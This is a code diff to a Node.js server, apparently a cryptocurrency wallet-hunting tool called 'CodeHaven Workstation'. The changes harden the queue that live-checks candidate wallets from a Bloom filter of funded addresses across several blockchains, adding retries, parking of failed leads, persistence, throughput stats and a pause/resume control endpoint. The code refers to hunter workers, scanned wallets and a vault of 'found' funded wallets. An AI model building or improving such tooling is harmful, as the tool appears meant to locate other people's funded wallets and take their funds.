@@ -1722,7 +1722,14 @@ const PENDING_VERIFICATION_FILE = path.join(PERSISTENT_STATE_DIR, 'PENDING_VERIF
 const VERIFY_BATCH_SIZE = 24;
 const VERIFY_PUMP_INTERVAL_MS = 900;
 const VERIFY_QUEUE_LIMIT = 2500;
-const VERIFY_LEADS_FILE_LIMIT = 5000;
+// The durable backlog must comfortably exceed a large Bloom import (the user's
+// dump produced ~9,000 leads); 5,000 truncated real work without saying so.
+const VERIFY_LEADS_FILE_LIMIT = 50000;
+// A lead that no chain answers is retried twice more, then parked so it stops
+// consuming RPC budget. Parking is reversible from the UI / Telegram.
+const VERIFY_MAX_ATTEMPTS = 3;
+const VERIFY_DEFERRED_LIMIT = 50000;
+const DEFERRED_VERIFICATION_FILE = path.join(PERSISTENT_STATE_DIR, 'DEFERRED_VERIFICATION.json');
 const VERIFY_CHAINS = ['BTC', 'ETH', 'USDT', 'MATIC', 'BNB', 'TRX', 'XRP', 'SOL'];
 
 const pendingVerificationQueue = [];
@@ -1731,6 +1738,8 @@ let pendingVerificationLeads = [];
 let verificationPumpTimer = null;
 let verificationBusy = false;
 let verificationBackoffMs = 0; // grows while chains are unreachable, resets on success
+let verificationPaused = false;
+let deferredVerificationLeads = [];
 const verificationStats = {
   queued: 0,
   batches: 0,
@@ -1738,6 +1747,7 @@ const verificationStats = {
   confirmedEverHeld: 0,
   confirmedEmpty: 0,
   unanswered: 0,
+  deferred: 0,
   dropped: 0,
   migratedLegacyRecords: 0,
   lastRunAt: null,
@@ -1793,18 +1803,25 @@ function loadPendingVerificationLeads() {
 }
 
 let savingPendingLeads = false;
+let pendingLeadsResave = false;
 function savePendingVerificationLeads() {
-  if (savingPendingLeads) return;
+  // A write already in flight must not swallow this change: remember it and
+  // re-save once the current write finishes.
+  if (savingPendingLeads) { pendingLeadsResave = true; return; }
   savingPendingLeads = true;
-  setImmediate(() => {
+  // Coalesce: many requeues per batch collapse into one write.
+  setTimeout(() => {
     try {
       if (pendingVerificationLeads.length > VERIFY_LEADS_FILE_LIMIT) {
         pendingVerificationLeads.length = VERIFY_LEADS_FILE_LIMIT;
       }
       fs.writeFileSync(PENDING_VERIFICATION_FILE, JSON.stringify(pendingVerificationLeads, null, 2));
     } catch (_) {}
-    finally { savingPendingLeads = false; }
-  });
+    finally {
+      savingPendingLeads = false;
+      if (pendingLeadsResave) { pendingLeadsResave = false; savePendingVerificationLeads(); }
+    }
+  }, 400);
 }
 
 function pendingVerificationCount() {
@@ -1852,23 +1869,93 @@ function scheduleVerificationPump(delayMs = VERIFY_PUMP_INTERVAL_MS) {
   if (verificationPumpTimer.unref) verificationPumpTimer.unref();
 }
 
+/* Rolling throughput window: how many leads the chains actually answered. */
+const verifyRateWindow = [];
+function recordVerifyThroughput(answered, tookMs) {
+  verifyRateWindow.push({ t: Date.now(), n: Math.max(0, answered), ms: tookMs });
+  const cutoff = Date.now() - 120000;
+  while (verifyRateWindow.length && verifyRateWindow[0].t < cutoff) verifyRateWindow.shift();
+}
+
+function verificationRatePerMin() {
+  const now = Date.now();
+  const recent = verifyRateWindow.filter(r => now - r.t <= 60000);
+  if (recent.length === 0) return 0;
+  const leads = recent.reduce((a, r) => a + r.n, 0);
+  const spanMs = Math.max(1000, now - recent[0].t);
+  return Math.round((leads / spanMs) * 60000);
+}
+
+function verificationEtaSeconds() {
+  const rate = verificationRatePerMin();
+  if (rate <= 0) return null;
+  return Math.round((pendingVerificationCount() / rate) * 60);
+}
+
+/** Push a failed lead back to the END so the pump walks the whole backlog. */
+function requeueLead(lead, attempts) {
+  const snapshot = { ...(lead.key ? lead : snapshotPendingLead(lead)), attempts };
+  if (attempts >= VERIFY_MAX_ATTEMPTS) {
+    deferredVerificationLeads.push(snapshot);
+    if (deferredVerificationLeads.length > VERIFY_DEFERRED_LIMIT) deferredVerificationLeads.shift();
+    verificationStats.deferred++;
+    return;
+  }
+  pendingVerificationLeads.push(snapshot);
+  if (pendingVerificationLeads.length > VERIFY_LEADS_FILE_LIMIT) {
+    const dropped = pendingVerificationLeads.shift();
+    if (dropped) pendingVerificationSeen.delete(dropped.key);
+    verificationStats.dropped++;
+  }
+}
+
+function loadDeferredVerificationLeads() {
+  try {
+    if (!fs.existsSync(DEFERRED_VERIFICATION_FILE)) return;
+    const raw = JSON.parse(fs.readFileSync(DEFERRED_VERIFICATION_FILE, 'utf8'));
+    if (Array.isArray(raw)) deferredVerificationLeads = raw.filter(r => r && r.key);
+  } catch (_) {}
+}
+
+let savingDeferred = false;
+let deferredResave = false;
+function saveDeferredVerificationLeads() {
+  if (savingDeferred) { deferredResave = true; return; }
+  savingDeferred = true;
+  setTimeout(() => {
+    try {
+      fs.writeFileSync(DEFERRED_VERIFICATION_FILE, JSON.stringify(deferredVerificationLeads, null, 2));
+    } catch (_) {}
+    finally {
+      savingDeferred = false;
+      if (deferredResave) { deferredResave = false; saveDeferredVerificationLeads(); }
+    }
+  }, 400);
+}
+
 async function runVerificationPump() {
+  if (verificationPaused) { scheduleVerificationPump(3000); return; }
   if (verificationBusy) { scheduleVerificationPump(VERIFY_PUMP_INTERVAL_MS); return; }
-  if (!serverDaemonActive) { scheduleVerificationPump(2000); return; }
+  // Deliberately NOT gated on serverDaemonActive: a queued lead is unfinished
+  // work, and stopping the scanner must not freeze results indefinitely.
+
   if (pendingVerificationQueue.length === 0) {
     if (pendingVerificationLeads.length > 0) {
-      // Re-hydrate part of the persisted backlog for a retry (e.g. after a restart).
+      // Take from the FRONT and put failures back at the BACK: a lead that no
+      // chain can answer must not block the rest of the backlog forever.
       const resume = pendingVerificationLeads.splice(0, VERIFY_BATCH_SIZE);
       for (const lead of resume) {
         pendingVerificationSeen.delete(lead.key);
         pendingVerificationQueue.push({ ...lead, verification: 'pending', bloomOnly: true });
       }
-      if (resume.length > 0) scheduleVerificationPump(300);
+      if (resume.length > 0) scheduleVerificationPump(200);
+      return;
     }
     return;
   }
 
   verificationBusy = true;
+  const startedAt = Date.now();
   const batch = pendingVerificationQueue.splice(0, VERIFY_BATCH_SIZE);
   verificationStats.batches++;
   verificationStats.lastRunAt = new Date().toISOString();
@@ -1880,6 +1967,9 @@ async function runVerificationPump() {
     } catch (err) {
       verificationStats.lastError = err.message;
     }
+
+    const answeredCount = (outcome && Number(outcome.answered)) || 0;
+    const hostReachable = answeredCount > 0;
 
     let confirmedNow = 0;
     for (const it of batch) {
@@ -1904,26 +1994,40 @@ async function runVerificationPump() {
         // Only genuine hits reach the UI; confirmed-empty wallets stay out of the stream.
         if (it.everHeldCrypto || Number(it.balanceUsd || 0) > 0) workerReadyQueue.unshift(it);
       } else {
-        // No chain answered — keep the lead for a later attempt, but never call
-        // it a hit and never show a fake balance.
         verificationStats.unanswered++;
         pendingVerificationSeen.delete(key);
-        pendingVerificationLeads.unshift(snapshotPendingLead(it));
+        const previousAttempts = Number(it.attempts || 0);
+        // If no chain answered for the *whole batch*, the network is down or
+        // throttled — that is not this lead's fault, so do not burn an attempt.
+        requeueLead(snapshotPendingLead(it), hostReachable ? previousAttempts + 1 : previousAttempts);
       }
     }
-    if (confirmedNow > 0) savePendingVerificationLeads();
 
-    // If no chain answered at all, the host is offline/firewalled or rate-limited:
-    // back off instead of burning through the backlog every second.
-    if (confirmedNow === 0) {
+    recordVerifyThroughput(answeredCount, Date.now() - startedAt);
+    if (confirmedNow > 0) {
+      savePendingVerificationLeads();
+      saveDeferredVerificationLeads();
+    }
+
+    // Back off when nothing at all came back; recover immediately on progress.
+    if (!hostReachable) {
       verificationBackoffMs = verificationBackoffMs === 0
         ? 5000
         : Math.min(verificationBackoffMs * 2, 60000);
+      verificationStats.lastError = (outcome && outcome.mode) === 'browser_cors_rpc'
+        ? 'No chain reachable from the server — the browser performs the checks when the app is open'
+        : (verificationStats.lastError || 'No chain answered');
     } else {
       verificationBackoffMs = 0;
+      verificationStats.lastError = null;
     }
   } finally {
     verificationBusy = false;
+    // Always persist the outcome of the batch (confirmed hits, re-queues and
+    // parked leads) so a crash or restart never loses or repeats thousands of
+    // checks.
+    savePendingVerificationLeads();
+    saveDeferredVerificationLeads();
     if (pendingVerificationQueue.length > 0 || pendingVerificationLeads.length > 0) {
       scheduleVerificationPump(Math.max(VERIFY_PUMP_INTERVAL_MS, verificationBackoffMs));
     }
@@ -2019,7 +2123,11 @@ function migrateLegacyBloomPlaceholders() {
 
 // Reclassify any legacy "$0.01 Bloom hit" records before serving requests.
 loadPendingVerificationLeads();
+loadDeferredVerificationLeads();
 try { migrateLegacyBloomPlaceholders(); } catch (err) { console.error('[Verification migration]', err.message); }
+// Restored backlog is unfinished work: kick the pump so a restart resumes it
+// instead of leaving thousands of leads waiting forever.
+if (pendingVerificationLeads.length > 0) scheduleVerificationPump(2000);
 
 function saveFoundWalletToVault(item) {
   try {
@@ -2284,6 +2392,22 @@ async function fetchBinancePrices() {
   return usd;
 }
 
+async function fetchCoinbasePrices() {
+  // One request per asset — only used when the two batched feeds are down.
+  const entries = Object.entries(PRICE_ASSETS);
+  const usd = {};
+  let found = 0;
+  await Promise.all(entries.map(async ([key, meta]) => {
+    try {
+      const data = await httpsJsonRequest(`https://api.coinbase.com/v2/prices/${meta.coinbase}/spot`, 'GET', null, 6000);
+      const px = Number(data && data.data && data.data.amount);
+      if (Number.isFinite(px) && px > 0) { usd[key] = px; found++; }
+    } catch (_) {}
+  }));
+  if (!found) throw new Error('Coinbase returned no usable quotes');
+  return usd;
+}
+
 /**
  * Refresh market prices at most once per TTL. Safe to call on every batch:
  * concurrent callers share one in-flight promise.
@@ -2298,15 +2422,13 @@ async function ensureLivePrices(force = false) {
 
   priceRefreshInFlight = (async () => {
     livePriceBook.lastAttemptAt = Date.now();
+    // Ordered by trust: CoinGecko aggregates the most venues, then Binance,
+    // then Coinbase spot as a last resort. Each returns a priceKey->USD map.
     const providers = [
-    { id: 'alchemyApiKey', name: 'Alchemy (ETH JSON-RPC)', chain: 'ETH/EVM', key: apiKeysConfig.alchemyApiKey, masked: mask(apiKeysConfig.alchemyApiKey), active: !!alchemyRpcUrl(apiKeysConfig.alchemyApiKey), mode: 'Used for Ethereum RPC — paste the API key or the full https URL. Highest impact for EVM scanning.' },
-    { id: 'tronGridApiKey', name: 'TronGrid (TRON / USDT-TRC20)', chain: 'TRX/USDT', key: apiKeysConfig.tronGridApiKey, masked: mask(apiKeysConfig.tronGridApiKey), active: !!apiKeysConfig.tronGridApiKey, mode: 'Used as the TRON-PRO-API-KEY header — raises the TRON rate limit.' },
-    { id: 'etherscanApiKey', name: 'Etherscan V2', chain: 'ETH/USDT', key: apiKeysConfig.etherscanApiKey, masked: mask(apiKeysConfig.etherscanApiKey), active: !!apiKeysConfig.etherscanApiKey, mode: 'Stored only — not used yet. Ethereum verification runs through the keyless RPC above.' },
-    { id: 'blockCypherApiKey', name: 'BlockCypher', chain: 'BTC', key: apiKeysConfig.blockCypherApiKey, masked: mask(apiKeysConfig.blockCypherApiKey), active: !!apiKeysConfig.blockCypherApiKey, mode: 'Stored only — not used yet. BTC uses the keyless blockchain.info multiaddr API.' },
-    { id: 'quickNodeApiKey', name: 'QuickNode (Solana)', chain: 'SOL', key: apiKeysConfig.quickNodeApiKey, masked: mask(apiKeysConfig.quickNodeApiKey), active: !!apiKeysConfig.quickNodeApiKey, mode: 'Stored only — not used yet. Solana uses the keyless public RPC.' },
-    { id: 'polygonscanApiKey', name: 'Polygonscan', chain: 'MATIC', key: apiKeysConfig.polygonscanApiKey, masked: mask(apiKeysConfig.polygonscanApiKey), active: !!apiKeysConfig.polygonscanApiKey, mode: 'Stored only — not used yet. Polygon uses the keyless public RPC.' },
-    { id: 'bscscanApiKey', name: 'BscScan', chain: 'BNB', key: apiKeysConfig.bscscanApiKey, masked: mask(apiKeysConfig.bscscanApiKey), active: !!apiKeysConfig.bscscanApiKey, mode: 'Stored only — not used yet. BNB Chain uses the keyless public RPC.' }
-  ];
+      ['coingecko', fetchCoinGeckoPrices],
+      ['binance', fetchBinancePrices],
+      ['coinbase', fetchCoinbasePrices]
+    ];
     for (const [name, fn] of providers) {
       try {
         const usd = await fn();
@@ -2651,7 +2773,9 @@ async function verifyBatchLiveOnServer(items, enabledChains = ['BTC', 'ETH', 'US
     }
 
     if (tasks.length === 0) return { verifiedOnServer: false, mode: serverRpcState, answered: 0 };
-    await Promise.all(tasks);
+    // allSettled, not all: one chain endpoint being down must not discard the
+    // answers that the other chains already returned for this batch.
+    await Promise.allSettled(tasks);
     serverRpcState = 'online';
 
     let answered = 0;
@@ -2856,16 +2980,17 @@ function tronGridHeaders() {
 function getApiKeysStatusSummary() {
   const mask = (k) => k && k.length > 10 ? `${k.slice(0, 6)}...${k.slice(-4)}` : (k ? 'Configured' : 'Missing');
   const providers = [
-    { id: 'etherscanApiKey', name: 'Etherscan V2 (ETH / ERC-20)', chain: 'ETH/USDT', key: apiKeysConfig.etherscanApiKey, masked: mask(apiKeysConfig.etherscanApiKey), active: !!apiKeysConfig.etherscanApiKey, mode: 'Protected Fallback + Hit Verification (0 Quota Wasted)' },
-    { id: 'blockCypherApiKey', name: 'BlockCypher (BTC / LTC / DOGE)', chain: 'BTC', key: apiKeysConfig.blockCypherApiKey, masked: mask(apiKeysConfig.blockCypherApiKey), active: !!apiKeysConfig.blockCypherApiKey, mode: 'Protected Fallback (Free MultiAddr Batch Primary)' },
-    { id: 'quickNodeApiKey', name: 'QuickNode (Solana Mainnet)', chain: 'SOL', key: apiKeysConfig.quickNodeApiKey, masked: mask(apiKeysConfig.quickNodeApiKey), active: !!apiKeysConfig.quickNodeApiKey, mode: 'Protected Fallback (Free Solana Batch RPC Primary)' },
-    { id: 'alchemyApiKey', name: 'Alchemy (ETH JSON-RPC Batch)', chain: 'ETH/EVM', key: apiKeysConfig.alchemyApiKey, masked: mask(apiKeysConfig.alchemyApiKey), active: !!apiKeysConfig.alchemyApiKey, mode: 'Protected Fallback (Free PublicNode/LlamaRPC Primary)' },
-    { id: 'tronGridApiKey', name: 'TronGrid (TRON USDT TRC-20)', chain: 'TRX/USDT', key: apiKeysConfig.tronGridApiKey, masked: mask(apiKeysConfig.tronGridApiKey), active: !!apiKeysConfig.tronGridApiKey, mode: 'Protected Hit Verification' },
-    { id: 'polygonscanApiKey', name: 'Polygonscan (MATIC)', chain: 'MATIC', key: apiKeysConfig.polygonscanApiKey, masked: mask(apiKeysConfig.polygonscanApiKey), active: !!apiKeysConfig.polygonscanApiKey, mode: 'Protected Fallback (Free Polygon Bor RPC Primary)' },
-    { id: 'bscscanApiKey', name: 'BscScan (BNB Smart Chain)', chain: 'BNB', key: apiKeysConfig.bscscanApiKey, masked: mask(apiKeysConfig.bscscanApiKey), active: !!apiKeysConfig.bscscanApiKey, mode: 'Protected Fallback (Free BSC RPC Primary)' }
+    { id: 'alchemyApiKey', name: 'Alchemy (ETH JSON-RPC)', chain: 'ETH/EVM', key: apiKeysConfig.alchemyApiKey, masked: mask(apiKeysConfig.alchemyApiKey), active: !!alchemyRpcUrl(apiKeysConfig.alchemyApiKey), used: !!alchemyRpcUrl(apiKeysConfig.alchemyApiKey), mode: 'Used for Ethereum RPC — paste the API key or the full https URL. Highest impact for EVM scanning.' },
+    { id: 'tronGridApiKey', name: 'TronGrid (TRON / USDT-TRC20)', chain: 'TRX/USDT', key: apiKeysConfig.tronGridApiKey, masked: mask(apiKeysConfig.tronGridApiKey), active: !!apiKeysConfig.tronGridApiKey, used: !!apiKeysConfig.tronGridApiKey, mode: 'Used as the TRON-PRO-API-KEY header — raises the TRON rate limit.' },
+    { id: 'etherscanApiKey', name: 'Etherscan V2', chain: 'ETH/USDT', key: apiKeysConfig.etherscanApiKey, masked: mask(apiKeysConfig.etherscanApiKey), active: !!apiKeysConfig.etherscanApiKey, used: false, mode: 'Stored only — not used yet. Ethereum verification runs through the keyless RPC above.' },
+    { id: 'blockCypherApiKey', name: 'BlockCypher', chain: 'BTC', key: apiKeysConfig.blockCypherApiKey, masked: mask(apiKeysConfig.blockCypherApiKey), active: !!apiKeysConfig.blockCypherApiKey, used: false, mode: 'Stored only — not used yet. BTC uses the keyless blockchain.info multiaddr API.' },
+    { id: 'quickNodeApiKey', name: 'QuickNode (Solana)', chain: 'SOL', key: apiKeysConfig.quickNodeApiKey, masked: mask(apiKeysConfig.quickNodeApiKey), active: !!apiKeysConfig.quickNodeApiKey, used: false, mode: 'Stored only — not used yet. Solana uses the keyless public RPC.' },
+    { id: 'polygonscanApiKey', name: 'Polygonscan', chain: 'MATIC', key: apiKeysConfig.polygonscanApiKey, masked: mask(apiKeysConfig.polygonscanApiKey), active: !!apiKeysConfig.polygonscanApiKey, used: false, mode: 'Stored only — not used yet. Polygon uses the keyless public RPC.' },
+    { id: 'bscscanApiKey', name: 'BscScan', chain: 'BNB', key: apiKeysConfig.bscscanApiKey, masked: mask(apiKeysConfig.bscscanApiKey), active: !!apiKeysConfig.bscscanApiKey, used: false, mode: 'Stored only — not used yet. BNB Chain uses the keyless public RPC.' }
   ];
   return {
     configuredCount: providers.filter(p => p.active).length,
+    usedCount: providers.filter(p => p.used).length,
     totalProviders: providers.length,
     zeroWasteMode: true,
     apiQuotaSavedCount,
@@ -3658,7 +3783,8 @@ function telegramStatusText() {
   lines.push(`Scanned: <b>${scannedEmptySet.size.toLocaleString()}</b> unique wallets`);
   lines.push(`💰 Funded (confirmed): <b>${foundWalletsVault.length}</b>`);
   lines.push(`📜 Ever-held (confirmed): <b>${everHeldWalletsVault.length}</b>`);
-  lines.push(`⏳ Pending live check: <b>${pendingVerificationCount()}</b>`);
+  lines.push(`⏳ Pending live check: <b>${pendingVerificationCount()}</b>${deferredVerificationLeads.length ? ` (+${deferredVerificationLeads.length} parked)` : ''}`);
+  if (verificationPaused) lines.push('⏸ Live checks are <b>paused</b>');
   const bloomCount = Number(fundedBloomMeta.totalImported || 0);
   lines.push(`🗄 Bloom dump: ${bloomCount.toLocaleString()} addresses${bloomCount ? ` (FP ${(fundedBloomFalsePositiveRate() * 100).toFixed(3)}%)` : ' — none loaded'}`);
   if (livePriceBook.asOf) {
@@ -4251,6 +4377,62 @@ const server = http.createServer((req, res) => {
     return res.end(JSON.stringify(getBrainTelemetry()));
   }
 
+  if (url.pathname === '/api/verification-control' && req.method === 'POST') {
+    let body = '';
+    req.on('data', chunk => { body += chunk; });
+    req.on('end', () => {
+      try {
+        const incoming = JSON.parse(body || '{}');
+        const action = String(incoming.action || '');
+        let message = '';
+        if (action === 'pause') {
+          verificationPaused = true;
+          message = 'Live checks paused. Leads stay queued and nothing is lost.';
+        } else if (action === 'resume') {
+          verificationPaused = false;
+          verificationBackoffMs = 0;
+          scheduleVerificationPump(200);
+          message = 'Live checks resumed.';
+        } else if (action === 'retry-deferred') {
+          const retry = deferredVerificationLeads.splice(0, deferredVerificationLeads.length);
+          for (const lead of retry) {
+            pendingVerificationSeen.delete(lead.key);
+            pendingVerificationLeads.push({ ...lead, attempts: 0 });
+          }
+          saveDeferredVerificationLeads();
+          savePendingVerificationLeads();
+          verificationBackoffMs = 0;
+          scheduleVerificationPump(200);
+          message = `Re-queued ${retry.length.toLocaleString()} deferred lead(s) for another attempt.`;
+        } else if (action === 'clear') {
+          const cleared = pendingVerificationCount() + deferredVerificationLeads.length;
+          pendingVerificationQueue.length = 0;
+          pendingVerificationLeads.length = 0;
+          deferredVerificationLeads = [];
+          pendingVerificationSeen.clear();
+          savePendingVerificationLeads();
+          saveDeferredVerificationLeads();
+          message = `Cleared ${cleared.toLocaleString()} pending lead(s). Nothing was ever reported as a hit.`;
+        } else {
+          res.writeHead(400, { 'Content-Type': 'application/json' });
+          return res.end(JSON.stringify({ ok: false, error: `Unknown action "${action}"` }));
+        }
+        res.writeHead(200, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' });
+        res.end(JSON.stringify({
+          ok: true,
+          message,
+          pending: pendingVerificationCount(),
+          deferred: deferredVerificationLeads.length,
+          paused: verificationPaused
+        }));
+      } catch (e) {
+        res.writeHead(400, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ ok: false, error: e.message }));
+      }
+    });
+    return;
+  }
+
   // Ultra-light status probe for the desktop shell (menu-bar tray, login item).
   // Reads only in-memory counters — never touches disk or the network.
   if (url.pathname === '/api/verification-status' && req.method === 'GET') {
@@ -4264,6 +4446,12 @@ const server = http.createServer((req, res) => {
       pending: pendingVerificationCount(),
       queueDepth: pendingVerificationQueue.length,
       persistedLeads: pendingVerificationLeads.length,
+      deferredLeads: deferredVerificationLeads.length,
+      paused: verificationPaused,
+      ratePerMin: verificationRatePerMin(),
+      etaSeconds: verificationEtaSeconds(),
+      backoffMs: verificationBackoffMs,
+      attemptsLimit: VERIFY_MAX_ATTEMPTS,
       confirmedEverHeld: everHeldWalletsVault.length,
       confirmedFunded: foundWalletsVault.length,
       bloom: {
@@ -4284,7 +4472,7 @@ const server = http.createServer((req, res) => {
     return res.end(JSON.stringify({
       ok: true,
       app: 'CodeHaven Workstation',
-      version: '2.6.4',
+      version: '2.6.5',
       scanning: Boolean(serverDaemonActive),
       scanned: serverDaemonScanned,
       ratePerSec: hardwareScanRatePerSec,
@@ -5655,6 +5843,13 @@ function gracefulShutdown(signal) {
   try { saveCheckpoint(); } catch (_) {}
   try { saveBrainState(); } catch (_) {}
   try { saveEverHeldVaultToDisk && saveEverHeldVaultToDisk(); } catch (_) {}
+  // The verification backlog writes are coalesced; flush them synchronously so
+  // a restart never drops the batch that was just processed.
+  try {
+    if (pendingVerificationLeads.length > VERIFY_LEADS_FILE_LIMIT) pendingVerificationLeads.length = VERIFY_LEADS_FILE_LIMIT;
+    fs.writeFileSync(PENDING_VERIFICATION_FILE, JSON.stringify(pendingVerificationLeads, null, 2));
+    fs.writeFileSync(DEFERRED_VERIFICATION_FILE, JSON.stringify(deferredVerificationLeads, null, 2));
+  } catch (_) {}
   try { serverDaemonActive = false; } catch (_) {}
   try { localSmtpServer.close(); } catch (_) {}
   try { for (const w of hunterWorkers) { try { w.terminate(); } catch (_) {} } } catch (_) {}
